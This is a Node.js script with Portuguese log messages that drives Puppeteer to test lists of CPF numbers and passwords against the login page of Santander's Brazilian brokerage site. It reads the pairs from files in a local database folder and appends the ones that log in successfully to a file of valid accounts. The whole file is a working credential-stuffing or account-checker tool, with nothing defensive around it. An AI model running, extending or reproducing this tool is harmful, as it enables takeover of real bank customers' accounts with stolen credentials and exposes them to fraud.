const  puppeteer = require("puppeteer");
const lineReader = require('line-reader');
const  fs = require("fs");
function LoginSantader(cpf,senha){
    (async () => {
      try{ 
        console.log(`Inicializando com Sucesso ✅  [ BANK'S ] [ SANTANDER ] `);
        const browser = await puppeteer.launch({headless: false, args: ['--no-sandbox']});
        const page = await browser.newPage();
        await page.setViewport({ width: 1366, height: 768});
        console.log(`Processando com Sucesso ✅  [ BANK'S ] [ SANTANDER ]`);
        await page.goto('https://www.santandercorretora.com.br/corretora/home/', {waitUntil: 'networkidle0', timeout: 0});
        await new Promise(r => setTimeout(r, 5000));
        GetItem = await page.$x(`//*[@id="txtLogin"]`)
        await GetItem[0].type(cpf);
        await GetItem[0].press('Enter');
        await new Promise(r => setTimeout(r, 5000));
        GetItem = await page.$x(`//*[@id="senha"]`)
        await GetItem[0].type(senha);
        await new Promise(r => setTimeout(r, 2000));
        GetItem = await page.$x(`//*[@id="btnEntrar"]`)
        await GetItem[0].click();
        await new Promise(r => setTimeout(r, 2000));
        try{
          const text = await page.evaluate(() => Array.from(document.querySelectorAll('[class="modal-body"]'), element => element.textContent));
          console.log(`[ LOGIN COM INVALIDO: ${cpf}|${senha} | SALDO: NULL | INVESTIMENTO: NULL  [ BANK'S ] [ SANTANDER ] ]`);
          await page.close();
          await page.close();
        }catch{
          console.log(`[ LOGIN COM SUCESSO: ${cpf}|${senha} | SALDO: FALSE | INVESTIMENTO: FALSE  [ BANK'S ] [ SANTANDER ] ]`);
          fs.writeFileSync(`login_sucesso_santander.txt`, `${cpf}|${senha}\n`,{ flag: "a+" });
        }
        
      }catch(error){
        console.log(`Inicializando com Erro ❌ |  [ BANK'S ] [ SANTANDER ]`);
      }finally{
        console.log(`Finalizado com Sucesso ✅ |  [ BANK'S ] [ SANTANDER ]`);
      }
    })();
  };
async function CheckDB(){
  await fs.readdir("./db", async  function readdir(err, files) {
     result_db = await Array();
     await result_db.push(files);
    for(let index = 0; index < result_db[0].length; index++){
      let file = await result_db[0][index];
      lineReader.eachLine(`./db/${file}`,async function(line, last) {
        let array_db = Array();
        let array_pass = Array();
        let separador = await line.split("|");
        let cpf = await separador[0];
        let senha = await separador[1];
        if(typeof cpf === "string" && typeof senha === "string" ){
          if(!isNaN(cpf)&&!isNaN(senha)){
            array_db.push(cpf);
            array_pass.push(senha);
          }
        }
        array_db.forEach(async (cpfs) => {
          array_pass.forEach(async (senhas) => {
            if(cpfs.length>=1 && senhas.length>=1){
              await console.log(`[ TEST ] CPF: ${cpfs} | SENHA: ${senhas}\n`);
              setTimeout(async function(){
                await console.log(`[ START ] CPF: ${cpfs} | SENHA: ${senhas}\n`);
                await LoginSantader(cpfs,senhas);
              },10000)
            }
          });
        });
      });}});
}
CheckDB()